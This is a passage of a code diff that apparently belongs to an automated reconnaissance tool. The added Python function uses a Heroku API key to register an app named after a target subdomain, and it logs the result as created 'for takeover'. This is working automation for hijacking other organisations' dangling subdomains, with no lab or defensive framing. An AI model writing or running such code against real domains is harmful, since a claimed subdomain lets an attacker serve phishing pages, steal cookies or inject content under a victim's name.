+        """Auto-create Heroku app for subdomain takeover."""
+        app_name = subdomain.split(".")[0]
+        headers = {
+            "Accept": "application/vnd.heroku+json; version=3",
+            "Authorization": f"Bearer {HEROKU_API_KEY}"
+        }
+        data = {
+            "name": app_name,
+            "region": "us"
+        }
+        resp = requests.post("https://api.heroku.com/apps", headers=headers, json=data)
+        if resp.status_code == 201:
+            print(f"  [+] Heroku app {app_name} created for takeover") 
 class IntelOrchestrator:
     """Wire everything together: scrape → extract → scan → check → report."""
 
